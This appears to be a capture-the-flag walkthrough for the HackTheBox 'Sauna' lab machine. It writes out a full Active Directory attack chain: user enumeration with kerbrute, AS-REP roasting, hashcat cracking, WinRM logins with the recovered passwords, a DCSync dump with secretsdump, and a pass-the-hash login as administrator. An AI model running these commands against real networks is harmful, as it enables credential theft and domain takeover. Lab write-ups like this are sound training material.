---
icon: windows
---

# Sauna - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.175 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 22:04 EDT
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.035s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 09:06:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)                                                                                            
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10                                                                            
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)                                                            
No exact OS matches for host (test conditions non-ideal).                                                                                           
Network Distance: 2 hops                                                                                                                            
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                               
                                                                                                                                                    
Host script results:                                                                                                                                
| smb2-time:                                                                                                                                        
|   date: 2025-10-14T09:07:02                                                                                                                       
|_  start_date: N/A                                                                                                                                 
| smb2-security-mode:                                                                                                                               
|   3:1:1:                                                                                                                                          
|_    Message signing enabled and required                                                                                                          
|_clock-skew: 7h00m06s                                                                                                                              
                                                                                                                                                    
TRACEROUTE (using port 139/tcp)                                                                                                                     
HOP RTT      ADDRESS                                                                                                                                
1   45.61 ms 10.10.16.1                                                                                                                             
2   45.71 ms sauna.htb (10.10.10.175)
```

Nmap identified the domain name `EGOTISTICAL-BANK.LOCAL` I will add it to `/etc/hosts`  as well as `sauna.htb`

```
10.10.10.175	sauna.htb EGOTISTICAL-BANK.LOCAL
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2687).png" alt=""><figcaption></figcaption></figure>

I found some employees. I'll add them to a file and try to generate a list of usernames and verify them using kerbrute

Generating a list of usernames using [**username-anarchy**](https://github.com/urbanadventurer/username-anarchy)

{% code overflow="wrap" %}
```bash
~/tools/username-anarchy/username-anarchy -i users | tee usernames~/tools/username-anarchy/username-anarchy -i users | tee usernames
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2688).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Kerbrute</mark>

I will try brute forcing some usernames with [**kerbrute**](https://github.com/ropnop/kerbrute/releases)

{% code overflow="wrap" %}
```bash
kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local usernames
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2689).png" alt=""><figcaption></figcaption></figure>

We got a user!&#x20;

### <mark style="color:$primary;">AS-REP Roasting</mark>

I'll try AS-REP Roasting and see if he has `DONT_REQ_PREAUTH` option on and try to grab his hash

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers -no-pass -dc-ip 10.10.10.175 'egotistical-bank.local/fsmith' -format hashcat -outputfile hashes.aspreroast
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2690).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking Hash</mark>

{% code overflow="wrap" %}
```bash
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt
```
{% endcode %}

```bash
hashcat -m 18200 hashes.aspreroast --show
```

<figure><img src="../../.gitbook/assets/image (2691).png" alt=""><figcaption></figcaption></figure>

```bash
netexec winrm egotistical-bank.local -u fsmith -p Thestrokes23
```

<figure><img src="../../.gitbook/assets/image (2692).png" alt=""><figcaption></figcaption></figure>

This user has winrm access!

```bash
evil-winrm -i egotistical-bank.local -u fsmith -p Thestrokes23
```

<figure><img src="../../.gitbook/assets/image (2693).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

Checking for Autologon credentials we found some!

<figure><img src="../../.gitbook/assets/image (2694).png" alt=""><figcaption></figcaption></figure>

We found some credentials for the svc\_loanmanager user!

Running `net user` on the box we discover there is no `svc_loanmanager` but there is a `svc_loanmgr` and the credentials work for him!

<figure><img src="../../.gitbook/assets/image (2695).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
netexec winrm egotistical-bank.local -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2696).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Bloodhound</mark>

{% code overflow="wrap" %}
```bash
netexec ldap egotistical-bank.local -u svc_loanmgr -p 'Moneymakestheworldgoround!' --bloodhound --collection All --dns-server 10.10.10.175
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2697).png" alt=""><figcaption></figcaption></figure>

Let's start bloodhound and take a look

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (2698).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2699).png" alt=""><figcaption></figcaption></figure>

I know it's hard to see but at the top we see that svc\_loanmgr has DCSync Rights

### <mark style="color:$primary;">DCSync Attack</mark>

{% code overflow="wrap" %}
```bash
impacket-secretsdump "egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!"@"egotistical-bank.local"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2700).png" alt=""><figcaption></figcaption></figure>

We got the administrators NTLM! Now we can get a shell as administrator

{% code overflow="wrap" %}
```bash
evil-winrm -i egotistical-bank.local -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2701).png" alt=""><figcaption></figcaption></figure>
